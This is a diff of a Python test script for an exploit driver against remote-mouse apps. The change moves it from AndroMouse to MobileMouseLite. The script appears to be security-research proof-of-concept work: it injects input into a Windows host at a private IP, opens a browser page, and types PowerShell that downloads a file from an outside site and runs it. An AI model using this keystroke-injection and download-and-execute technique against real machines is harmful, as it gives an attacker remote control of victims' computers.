@@ -1,12 +1,12 @@
 import sys
-from andromouse_driver import AndroMouseDriver as driver
+from mmlite_driver import MMLiteDriver as driver
 from time import sleep
 
 IP = "172.16.78.131"
-PORT = 8888
+PORT = 9099
 
 """
-Tests the AndroMouse exploit driver by:
+Tests the MobileMouseLite exploit driver by:
     - opening the Windows start menu
     - opening Yahoo in the primary web browser
 
@@ -27,14 +27,17 @@ def main():
     tests = [test_open_url,
              test_powershell]
 
+    sleep(2)
+
     for run in tests:
         clean_environment(r)
         run(r)
         sleep(3)
 
+    r.close()
+
 def clean_environment(r):
     r.move_mouse(-2000,-2000)
-    sleep(2)
 
 """
 Demonstrates that we can both open an arbitrary page in the default browser and
@@ -67,6 +70,7 @@ def test_powershell(r):
     r.type('$c = new-object System.Net.WebClient\n') \
      .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
      .type('.\\Desktop\\BackImage.jpg\n')
+    pass
 
 if __name__ == "__main__":
     main()
